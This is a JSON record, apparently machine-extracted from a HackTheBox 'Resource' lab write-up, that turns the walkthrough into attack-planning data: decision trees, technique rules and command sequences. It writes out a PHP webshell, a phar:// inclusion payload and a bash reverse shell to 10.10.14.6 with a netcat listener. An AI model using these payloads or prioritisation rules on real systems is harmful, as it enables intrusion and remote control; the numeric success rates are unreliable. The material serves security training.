{
  "writeup_id": "Htb_Resource",
  "scenario_fingerprint": {
    "scenario_name": "linux_multi_host_ssh_certificate_abuse",
    "primary_services": [
      "http",
      "ssh"
    ],
    "port_signature": "22+80+2222",
    "service_combination": "nginx+apache+ssh_multi",
    "os_family": "linux_mixed",
    "environment_type": "containerized_infrastructure",
    "entry_vector": "phar_filter_webshell",
    "privilege_path": "container_to_ssh_cert_signing",
    "attack_complexity": "hard",
    "estimated_time": "3-4 hours",
    "scenario_confidence": 0.92,
    "distinguishing_factors": [
      "multiple_ssh_ports_different_os",
      "ssh_certificate_signing_infrastructure",
      "phar_filter_exploitation",
      "nginx_apache_proxy_setup",
      "bash_glob_vulnerability"
    ],
    "environmental_clues": [
      "itrc_subdomain_structure",
      "php_ticket_system",
      "har_file_credential_storage",
      "ssh_ca_key_management",
      "containerized_services"
    ],
    "similar_scenarios": [
      "multi_host_pivot_scenarios",
      "ssh_ca_abuse_boxes"
    ],
    "unique_aspects": [
      "ssh_certificate_authority_compromise",
      "multi_container_architecture",
      "it_resource_center_theme",
      "bash_glob_key_extraction"
    ]
  },
  "success_patterns": {
    "success_factors": [
      {
        "technique": "PHAR_filter_exploitation",
        "success_reason": "PHP application allowed zip file uploads and used phar:// wrapper for file inclusion",
        "prerequisite_indicators": [
          "php_application_identified",
          "file_upload_functionality_exists",
          "local_file_inclusion_vulnerability",
          "phar_wrapper_enabled"
        ],
        "recognition_patterns": [
          "zip attachment upload feature",
          "page parameter in URL (?page=)",
          "PHP error messages revealing file paths",
          "file inclusion without proper sanitization"
        ],
        "failure_modes": [
          "phar_wrapper_disabled",
          "file_upload_restrictions",
          "proper_input_sanitization",
          "file_type_validation"
        ],
        "environmental_factors": [
          "default_php_configuration",
          "containerized_application",
          "insufficient_upload_validation",
          "legacy_file_inclusion_patterns"
        ],
        "success_probability": 0.75,
        "typical_timeframe": "30-60 minutes"
      },
      {
        "technique": "SSH_certificate_signing_abuse",
        "success_reason": "Old SSH certificate signing key remained valid despite departmental changes",
        "prerequisite_indicators": [
          "ssh_certificate_infrastructure_present",
          "multiple_ssh_ports_available",
          "organizational_changes_mentioned",
          "legacy_keys_not_revoked"
        ],
        "recognition_patterns": [
          "multiple SSH services on different ports",
          "certificate-based authentication",
          "organizational context about moved responsibilities",
          "valid signing keys in accessible locations"
        ],
        "failure_modes": [
          "certificates_properly_revoked",
          "key_rotation_implemented",
          "proper_certificate_validation",
          "restricted_principal_names"
        ],
        "environmental_factors": [
          "complex_organizational_structure",
          "incomplete_security_transitions",
          "legacy_infrastructure_components",
          "insufficient_key_management"
        ],
        "success_probability": 0.65,
        "typical_timeframe": "45-90 minutes"
      },
      {
        "technique": "bash_glob_vulnerability",
        "success_reason": "Bash script used unquoted variables allowing glob expansion to leak sensitive files",
        "prerequisite_indicators": [
          "bash_scripts_with_sudo_access",
          "file_path_validation_present",
          "unquoted_variable_usage",
          "glob_patterns_not_disabled"
        ],
        "recognition_patterns": [
          "sudo privileges on bash scripts",
          "file validation logic in scripts",
          "unquoted variable expansions",
          "wildcard characters accepted in input"
        ],
        "failure_modes": [
          "proper_variable_quoting",
          "glob_expansion_disabled",
          "strict_input_validation",
          "restricted_file_access"
        ],
        "environmental_factors": [
          "custom_administrative_scripts",
          "insufficient_bash_security_practices",
          "complex_file_validation_logic",
          "privileged_script_execution"
        ],
        "success_probability": 0.55,
        "typical_timeframe": "60-120 minutes"
      }
    ],
    "critical_discoveries": [
      {
        "discovery": "zip_upload_with_phar_inclusion",
        "discovery_method": "ticket system file attachment analysis",
        "why_critical": "Enabled webshell execution through PHAR filter exploitation",
        "how_to_recognize": [
          "file upload functionality in tickets",
          "PHP application with page parameter",
          "lack of file type restrictions",
          "phar wrapper availability"
        ],
        "follow_up_actions": [
          "create_phar_webshell_payload",
          "upload_via_ticket_system",
          "trigger_inclusion_via_page_parameter",
          "establish_reverse_shell"
        ]
      },
      {
        "discovery": "har_file_with_credentials",
        "discovery_method": "database enumeration after initial access",
        "why_critical": "Contained authentication credentials for privilege escalation",
        "how_to_recognize": [
          "database access after webshell",
          "har files in ticket attachments",
          "credential data in HTTP archive format",
          "user authentication tokens"
        ],
        "follow_up_actions": [
          "extract_credentials_from_har",
          "test_ssh_access",
          "enumerate_certificate_infrastructure",
          "locate_signing_keys"
        ]
      },
      {
        "discovery": "legacy_ssh_signing_key",
        "discovery_method": "file system enumeration with valid credentials",
        "why_critical": "Allowed certificate generation for privilege escalation across hosts",
        "how_to_recognize": [
          "ssh certificate infrastructure present",
          "multiple ssh services",
          "organizational context about moved responsibilities",
          "accessible signing key files"
        ],
        "follow_up_actions": [
          "generate_ssh_certificates",
          "test_certificate_validity",
          "enumerate_principal_names",
          "pivot_between_hosts"
        ]
      }
    ],
    "escalation_keys": [
      {
        "privilege_level": "web_user",
        "escalation_method": "phar_filter_to_webshell",
        "why_possible": "PHP application allowed zip uploads and used vulnerable file inclusion",
        "recognition_signs": [
          "php_application_with_uploads",
          "page_parameter_inclusion",
          "phar_wrapper_enabled",
          "insufficient_upload_validation"
        ],
        "exploitation_path": "Upload PHAR → Trigger inclusion → Webshell → Container access"
      },
      {
        "privilege_level": "container_user",
        "escalation_method": "credential_extraction_to_ssh",
        "why_possible": "Database contained HAR file with valid user credentials",
        "recognition_signs": [
          "database_access_available",
          "har_files_in_tickets",
          "credential_data_present",
          "ssh_access_possible"
        ],
        "exploitation_path": "Database access → HAR extraction → SSH credentials → Host access"
      },
      {
        "privilege_level": "ssh_user",
        "escalation_method": "certificate_signing_to_root",
        "why_possible": "Legacy SSH signing key remained valid with broad permissions",
        "recognition_signs": [
          "ssh_certificate_infrastructure",
          "valid_signing_keys_accessible",
          "broad_principal_permissions",
          "insufficient_key_rotation"
        ],
        "exploitation_path": "SSH access → Signing key → Certificate generation → Root access"
      }
    ]
  },
  "decision_tree": {
    "decision_points": [
      {
        "step": 1,
        "situation": "Found HTTP service with file upload functionality accepting only ZIP files",
        "decision": "Test for PHAR deserialization via PHP filters",
        "reasoning": "ZIP upload restriction + PHP backend suggests PHAR filter exploitation potential",
        "confidence": 0.8,
        "alternatives": [
          {
            "option": "zip_slip_attack",
            "when": "if file extraction occurs"
          },
          {
            "option": "polyglot_file_upload",
            "when": "if mime type validation bypassed"
          }
        ],
        "success_indicators": [
          "phar_filter_execution",
          "webshell_accessible",
          "code_execution_confirmed"
        ],
        "next_decision": "establish_persistent_access"
      },
      {
        "step": 2,
        "situation": "Gained webshell access in containerized environment",
        "decision": "Enumerate database and application files for credentials",
        "reasoning": "Container suggests multi-tier architecture with credential reuse potential",
        "confidence": 0.9,
        "prerequisites": [
          "webshell_access",
          "php_execution"
        ],
        "success_indicators": [
          "database_access",
          "har_files_found",
          "credentials_discovered"
        ],
        "failure_fallbacks": [
          "process_enumeration",
          "network_discovery",
          "file_system_search"
        ]
      },
      {
        "step": 3,
        "situation": "Found SSH certificate signing key in compromised container",
        "decision": "Generate SSH certificate for privilege escalation",
        "reasoning": "SSH cert signing keys often have broader access than expected",
        "confidence": 0.85,
        "prerequisites": [
          "ssh_ca_key_found",
          "certificate_generation_capability"
        ],
        "success_indicators": [
          "certificate_generated",
          "ssh_access_gained"
        ],
        "next_decision": "enumerate_certificate_principals"
      },
      {
        "step": 4,
        "situation": "SSH certificate access to main host obtained",
        "decision": "Enumerate API endpoints for certificate generation",
        "reasoning": "Certificate infrastructure suggests API-driven provisioning system",
        "confidence": 0.75,
        "prerequisites": [
          "ssh_access_main_host",
          "api_discovery"
        ],
        "success_indicators": [
          "api_endpoints_found",
          "certificate_api_accessible"
        ],
        "failure_fallbacks": [
          "local_privilege_escalation",
          "service_enumeration"
        ]
      },
      {
        "step": 5,
        "situation": "Found bash script with sudo privileges for certificate generation",
        "decision": "Exploit bash glob vulnerability to bypass key restrictions",
        "reasoning": "Bash scripts with file operations often vulnerable to glob expansion attacks",
        "confidence": 0.7,
        "prerequisites": [
          "sudo_script_access",
          "glob_patterns_in_script"
        ],
        "success_indicators": [
          "key_leaked",
          "restriction_bypassed",
          "root_certificate_generated"
        ],
        "next_decision": "generate_root_ssh_certificate"
      }
    ],
    "branching_logic": {
      "if_phar_succeeds": {
        "action": "establish_webshell_and_enumerate",
        "tools": [
          "php_webshell",
          "database_clients"
        ],
        "next_phase": "credential_harvesting"
      },
      "if_credentials_found": {
        "action": "test_ssh_and_certificate_access",
        "alternatives": [
          "direct_ssh",
          "certificate_signing",
          "api_access"
        ],
        "decision_criteria": "based_on_credential_type_and_access_level"
      },
      "if_ssh_cert_key_found": {
        "action": "generate_certificates_for_escalation",
        "purpose": "gain_access_to_higher_privilege_systems",
        "tools": [
          "ssh-keygen",
          "custom_certificate_scripts"
        ]
      },
      "if_api_access_obtained": {
        "action": "enumerate_certificate_principals_and_permissions",
        "purpose": "identify_privilege_escalation_paths",
        "tools": [
          "api_clients",
          "certificate_analysis"
        ]
      },
      "if_bash_script_found": {
        "action": "analyze_for_glob_vulnerabilities",
        "purpose": "bypass_security_restrictions",
        "tools": [
          "bash_analysis",
          "glob_exploitation"
        ]
      }
    },
    "optimization_rules": [
      {
        "rule": "always_test_phar_filters_on_php_zip_uploads",
        "reasoning": "high_success_rate_for_code_execution_in_php_applications",
        "applicability": "php_applications_with_zip_upload"
      },
      {
        "rule": "prioritize_ssh_certificate_enumeration_over_key_cracking",
        "reasoning": "certificates_often_have_broader_access_and_easier_exploitation",
        "applicability": "ssh_infrastructure_environments"
      },
      {
        "rule": "examine_bash_scripts_for_glob_vulnerabilities_when_sudo_access_available",
        "reasoning": "common_vulnerability_in_file_processing_scripts",
        "applicability": "sudo_accessible_bash_scripts"
      },
      {
        "rule": "enumerate_api_endpoints_after_gaining_any_system_access",
        "reasoning": "modern_infrastructure_often_api_driven_with_escalation_potential",
        "applicability": "containerized_or_microservice_environments"
      }
    ]
  },
  "applicability_rules": {
    "technique_rules": [
      {
        "technique": "PHAR_Filter_Exploitation",
        "mitre_id": "T1190",
        "required_services": [
          "http",
          "https"
        ],
        "required_ports": [
          80,
          443,
          8080,
          8443
        ],
        "os_requirements": [
          "linux",
          "windows"
        ],
        "environmental_prerequisites": [
          "php_application",
          "file_upload_functionality",
          "zip_file_processing",
          "phar_wrapper_enabled"
        ],
        "success_indicators": [
          "php_powered_by_header",
          "file_upload_forms_present",
          "zip_attachment_support",
          "phar_deserialization_possible"
        ],
        "incompatible_with": [
          "phar_wrapper_disabled",
          "strict_file_type_validation",
          "sandboxed_file_processing"
        ],
        "confidence_boosters": [
          "ticket_system_with_attachments",
          "php_version_8_plus",
          "apache_backend_nginx_proxy"
        ],
        "typical_success_rate": 0.75,
        "estimated_time": "15-30 minutes"
      },
      {
        "technique": "SSH_Certificate_Abuse",
        "mitre_id": "T1552.004",
        "required_services": [
          "ssh"
        ],
        "required_ports": [
          22,
          2222
        ],
        "os_requirements": [
          "linux"
        ],
        "environmental_prerequisites": [
          "ssh_certificate_authority_present",
          "certificate_signing_key_accessible",
          "multiple_ssh_services_detected"
        ],
        "success_indicators": [
          "ca_private_key_found",
          "certificate_signing_script_present",
          "api_certificate_generation_available"
        ],
        "incompatible_with": [
          "certificate_validation_strict",
          "key_rotation_frequent",
          "hardware_security_modules"
        ],
        "confidence_boosters": [
          "multiple_ssh_ports_different_os",
          "it_infrastructure_context",
          "certificate_management_apis"
        ],
        "typical_success_rate": 0.85,
        "estimated_time": "20-45 minutes"
      },
      {
        "technique": "Bash_Glob_Injection",
        "mitre_id": "T1059.004",
        "required_services": [
          "ssh"
        ],
        "required_ports": [
          22
        ],
        "os_requirements": [
          "linux"
        ],
        "environmental_prerequisites": [
          "bash_script_with_sudo_access",
          "glob_pattern_in_script",
          "file_path_user_controlled"
        ],
        "success_indicators": [
          "sudo_script_execution_allowed",
          "glob_expansion_vulnerable",
          "file_content_disclosure_possible"
        ],
        "incompatible_with": [
          "bash_strict_mode_enabled",
          "input_sanitization_present",
          "restricted_shell_environment"
        ],
        "confidence_boosters": [
          "certificate_generation_scripts",
          "file_validation_logic_present",
          "administrative_script_access"
        ],
        "typical_success_rate": 0.7,
        "estimated_time": "10-25 minutes"
      },
      {
        "technique": "HAR_File_Credential_Extraction",
        "mitre_id": "T1552.001",
        "required_services": [
          "http",
          "https"
        ],
        "required_ports": [
          80,
          443
        ],
        "os_requirements": [
          "any"
        ],
        "environmental_prerequisites": [
          "database_access_obtained",
          "har_files_stored",
          "web_debugging_artifacts_present"
        ],
        "success_indicators": [
          "database_enumeration_successful",
          "har_file_format_detected",
          "credentials_in_request_headers"
        ],
        "incompatible_with": [
          "credential_encryption_in_storage",
          "har_file_sanitization",
          "secure_artifact_handling"
        ],
        "confidence_boosters": [
          "development_environment_indicators",
          "debugging_tools_present",
          "unsanitized_database_storage"
        ],
        "typical_success_rate": 0.8,
        "estimated_time": "5-15 minutes"
      }
    ],
    "environmental_detectors": {
      "php_application": {
        "port_indicators": [
          80,
          443,
          8080,
          8443
        ],
        "service_indicators": [
          "http",
          "https"
        ],
        "banner_indicators": [
          "PHP",
          "X-Powered-By: PHP",
          "PHPSESSID"
        ],
        "confidence_threshold": 0.9
      },
      "ssh_infrastructure": {
        "port_indicators": [
          22,
          2222
        ],
        "service_indicators": [
          "ssh",
          "OpenSSH"
        ],
        "banner_indicators": [
          "OpenSSH",
          "protocol 2.0"
        ],
        "confidence_threshold": 0.95
      },
      "containerized_environment": {
        "port_indicators": [
          80,
          443
        ],
        "service_indicators": [
          "nginx",
          "apache"
        ],
        "banner_indicators": [
          "nginx",
          "Apache",
          "different_os_versions"
        ],
        "confidence_threshold": 0.85
      },
      "ticket_system": {
        "port_indicators": [
          80,
          443
        ],
        "service_indicators": [
          "http"
        ],
        "banner_indicators": [
          "ticket",
          "dashboard",
          "upload"
        ],
        "confidence_threshold": 0.8
      }
    },
    "attack_prioritization": {
      "high_priority": [
        {
          "attack": "phar_filter_exploitation",
          "when": "php_application_with_uploads_detected",
          "reason": "direct_code_execution_high_success_rate"
        },
        {
          "attack": "ssh_certificate_abuse",
          "when": "multiple_ssh_services_detected",
          "reason": "privilege_escalation_to_root_access"
        }
      ],
      "medium_priority": [
        {
          "attack": "har_file_credential_extraction",
          "when": "database_access_obtained",
          "reason": "reliable_credential_discovery_method"
        },
        {
          "attack": "bash_glob_injection",
          "when": "sudo_script_access_available",
          "reason": "file_disclosure_and_privilege_escalation"
        }
      ]
    }
  },
  "technique_intelligence": {
    "techniques": [
      {
        "name": "PHAR Filter File Inclusion",
        "mitre_id": "T1190",
        "category": "initial_access",
        "phase": "initial_access",
        "tools_used": [
          {
            "name": "zip",
            "command_template": "zip {archive_name}.zip {webshell_file}",
            "actual_command": "zip shell.zip shell.php",
            "output_pattern": "adding: shell.php (stored 0%)",
            "effectiveness_rating": 5,
            "reliability": 0.9
          },
          {
            "name": "phar_filter",
            "command_template": "?page=phar://uploads/{hash}.zip/{shell_name}",
            "actual_command": "?page=phar://uploads/a34387cd3eef30b8d5938ed770909f9a536d8fe0.zip/shell",
            "output_pattern": "PHP execution within zip archive",
            "effectiveness_rating": 5,
            "reliability": 0.85
          }
        ],
        "prerequisites": [
          "file_upload_functionality",
          "zip_file_upload_allowed",
          "php_include_vulnerability",
          "phar_wrapper_enabled"
        ],
        "success_indicators": [
          "zip_file_uploaded_successfully",
          "webshell_accessible_via_phar_filter",
          "command_execution_confirmed"
        ],
        "common_failures": [
          "phar_wrapper_disabled",
          "strict_file_type_validation",
          "zip_extraction_blocked",
          "include_path_restrictions"
        ],
        "follow_up_techniques": [
          "reverse_shell_establishment",
          "privilege_escalation",
          "lateral_movement"
        ],
        "time_investment": "10-20 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "PHP Webshell Upload",
        "mitre_id": "T1505.003",
        "category": "persistence",
        "phase": "initial_access",
        "tools_used": [
          {
            "name": "custom_php_shell",
            "command_template": "<?php system($_REQUEST[\"{param}\"]); ?>",
            "actual_command": "<?php system($_REQUEST[\"cmd\"]); ?>",
            "output_pattern": "Command output displayed in browser",
            "effectiveness_rating": 5,
            "reliability": 0.95
          }
        ],
        "prerequisites": [
          "file_upload_capability",
          "php_execution_environment",
          "web_accessible_upload_directory"
        ],
        "success_indicators": [
          "php_code_execution_confirmed",
          "system_commands_successful",
          "reverse_shell_established"
        ],
        "common_failures": [
          "php_execution_disabled",
          "file_extension_filtering",
          "upload_directory_restrictions"
        ],
        "follow_up_techniques": [
          "reverse_shell_upgrade",
          "system_enumeration",
          "credential_harvesting"
        ],
        "time_investment": "5-15 minutes",
        "skill_level": "beginner"
      },
      {
        "name": "Reverse Shell Establishment",
        "mitre_id": "T1059.004",
        "category": "execution",
        "phase": "initial_access",
        "tools_used": [
          {
            "name": "bash_reverse_shell",
            "command_template": "bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1",
            "actual_command": "bash -i >& /dev/tcp/10.10.14.6/443 0>&1",
            "output_pattern": "Connection received on attacker listener",
            "effectiveness_rating": 5,
            "reliability": 0.9
          },
          {
            "name": "netcat_listener",
            "command_template": "nc -lnvp {port}",
            "actual_command": "nc -lnvp 443",
            "output_pattern": "Listening on 0.0.0.0 443",
            "effectiveness_rating": 5,
            "reliability": 0.98
          }
        ],
        "prerequisites": [
          "command_execution_capability",
          "network_connectivity_to_attacker",
          "bash_available_on_target"
        ],
        "success_indicators": [
          "interactive_shell_established",
          "command_execution_confirmed",
          "file_system_access_gained"
        ],
        "common_failures": [
          "firewall_blocking_outbound",
          "bash_not_available",
          "network_connectivity_issues"
        ],
        "follow_up_techniques": [
          "shell_upgrade_with_pty",
          "privilege_escalation",
          "lateral_movement"
        ],
        "time_investment": "2-5 minutes",
        "skill_level": "beginner"
      },
      {
        "name": "Shell Upgrade with PTY",
        "mitre_id": "T1059.004",
        "category": "execution",
        "phase": "post_exploitation",
        "tools_used": [
          {
            "name": "script_command",
            "command_template": "script /dev/null -c bash",
            "actual_command": "script /dev/null -c bash",
            "output_pattern": "Script started, output log file is '/dev/null'",
            "effectiveness_rating": 5,
            "reliability": 0.95
          },
          {
            "name": "stty_raw",
            "command_template": "stty raw -echo ; fg",
            "actual_command": "stty raw -echo ; fg",
            "output_pattern": "Full interactive shell with job control",
            "effectiveness_rating": 5,
            "reliability": 0.9
          }
        ],
        "prerequisites": [
          "basic_shell_access",
          "script_command_available",
          "terminal_emulator_support"
        ],
        "success_indicators": [
          "tab_completion_works",
          "ctrl_c_handled_properly",
          "full_terminal_functionality"
        ],
        "common_failures": [
          "script_command_missing",
          "terminal_type_issues",
          "stty_command_unavailable"
        ],
        "follow_up_techniques": [
          "system_enumeration",
          "privilege_escalation",
          "persistence_establishment"
        ],
        "time_investment": "1-2 minutes",
        "skill_level": "beginner"
      }
    ],
    "tool_effectiveness": [
      {
        "tool": "feroxbuster",
        "use_case": "web_directory_enumeration",
        "effectiveness_rating": 5,
        "reliability": 0.95,
        "learning_curve": "low",
        "essential_for": [
          "web_application_testing"
        ],
        "alternatives": [
          "gobuster",
          "dirbuster",
          "ffuf"
        ],
        "best_practices": [
          "include_common_extensions_like_php",
          "use_appropriate_wordlists",
          "check_for_auto_filtering_issues"
        ]
      },
      {
        "tool": "nmap",
        "use_case": "network_service_discovery",
        "effectiveness_rating": 5,
        "reliability": 0.98,
        "learning_curve": "low",
        "essential_for": [
          "initial_reconnaissance"
        ],
        "alternatives": [
          "masscan",
          "rustscan"
        ],
        "best_practices": [
          "start_with_fast_port_scan",
          "follow_up_with_service_detection",
          "analyze_ssh_versions_for_os_identification"
        ]
      }
    ],
    "command_sequences": [
      {
        "sequence_name": "phar_filter_webshell_upload",
        "steps": [
          {
            "step": 1,
            "command": "echo '<?php system($_REQUEST[\"cmd\"]); ?>' > shell.php",
            "purpose": "Create PHP webshell",
            "expected_output": "PHP webshell file created"
          },
          {
            "step": 2,
            "command": "zip shell.zip shell.php",
            "purpose": "Package webshell in zip archive",
            "expected_output": "adding: shell.php (stored 0%)"
          },
          {
            "step": 3,
            "command": "Upload zip via web interface",
            "purpose": "Get zip file onto target server",
            "expected_output": "File uploaded to /uploads/ directory"
          },
          {
            "step": 4,
            "command": "?page=phar://uploads/{hash}.zip/shell&cmd=id",
            "purpose": "Execute webshell via phar filter",
            "expected_output": "Command execution output displayed"
          },
          {
            "step": 5,
            "command": "?page=phar://uploads/{hash}.zip/shell&cmd=bash -i >%26 /dev/tcp/10.10.14.6/443 0>%261",
            "purpose": "Establish reverse shell",
            "expected_output": "Connection received on listener"
          }
        ],
        "success_rate": 0.85,
        "typical_duration": "10-15 minutes"
      },
      {
        "sequence_name": "shell_upgrade_sequence",
        "steps": [
          {
            "step": 1,
            "command": "script /dev/null -c bash",
            "purpose": "Start script session for PTY",
            "expected_output": "Script started, output log file is '/dev/null'"
          },
          {
            "step": 2,
            "command": "Ctrl+Z to background",
            "purpose": "Background the shell",
            "expected_output": "Job stopped notification"
          },
          {
            "step": 3,
            "command": "stty raw -echo ; fg",
            "purpose": "Set raw terminal mode and foreground",
            "expected_output": "Shell returns with full functionality"
          },
          {
            "step": 4,
            "command": "reset",
            "purpose": "Reset terminal settings",
            "expected_output": "Terminal type prompt"
          },
          {
            "step": 5,
            "command": "screen",
            "purpose": "Set terminal type",
            "expected_output": "Fully functional interactive shell"
          }
        ],
        "success_rate": 0.95,
        "typical_duration": "1-2 minutes"
      }
    ]
  },
  "metadata": {
    "basic_metadata": {
      "name": "Resource",
      "difficulty": "Hard",
      "os": "Linux",
      "platform": "HackTheBox",
      "release_date": "2024-08-03",
      "author": "0xdf",
      "estimated_time": "3-4 hours"
    },
    "intelligence_metadata": {
      "attack_complexity": "high",
      "skill_level_required": "advanced",
      "primary_attack_vectors": [
        "web_exploitation",
        "ssh_certificate_abuse",
        "api_exploitation"
      ],
      "key_vulnerabilities": [
        "phar_filter_injection",
        "ssh_certificate_signing",
        "bash_glob_vulnerability"
      ],
      "environment_type": "corporate_it_infrastructure",
      "real_world_relevance": "very_high",
      "learning_value": [
        "phar_deserialization",
        "ssh_certificate_attacks",
        "api_security",
        "bash_vulnerabilities"
      ],
      "prerequisite_knowledge": [
        "web_exploitation",
        "ssh_certificates",
        "api_testing",
        "bash_scripting"
      ]
    },
    "categorization": {
      "primary_category": "web_exploitation",
      "subcategories": [
        "ssh_certificate_abuse",
        "api_exploitation",
        "container_escape"
      ],
      "attack_types": [
        "initial_access",
        "privilege_escalation",
        "lateral_movement"
      ],
      "defensive_lessons": [
        "secure_file_upload",
        "ssh_certificate_management",
        "api_security",
        "bash_script_hardening"
      ]
    },
    "similarity_markers": {
      "similar_boxes": [
        "Intentions",
        "Sandworm",
        "Topology"
      ],
      "similarity_reasons": [
        "complex_web_exploitation",
        "multi_stage_attacks",
        "ssh_certificate_abuse"
      ],
      "unique_aspects": [
        "phar_filter_exploitation",
        "it_resource_center_theme",
        "bash_glob_vulnerability"
      ],
      "difficulty_factors": [
        "multiple_pivots_required",
        "advanced_web_techniques",
        "ssh_certificate_knowledge"
      ]
    }
  },
  "extraction_metadata": {
    "parse_date": "2025-07-04T18:59:31.199755",
    "original_file": "0xdf_writeups/Htb Resource.md",
    "content_length": 55246,
    "extraction_version": "2.0-claude",
    "model_used": "claude-sonnet-4-20250514"
  },
  "intelligence_confidence": 1.0,
  "quality_breakdown": {
    "scenario_uniqueness": 1.0,
    "success_logic_clarity": 1.0,
    "applicability_completeness": 1.0,
    "decision_tree_depth": 1.0,
    "technique_actionability": 1.0
  }
}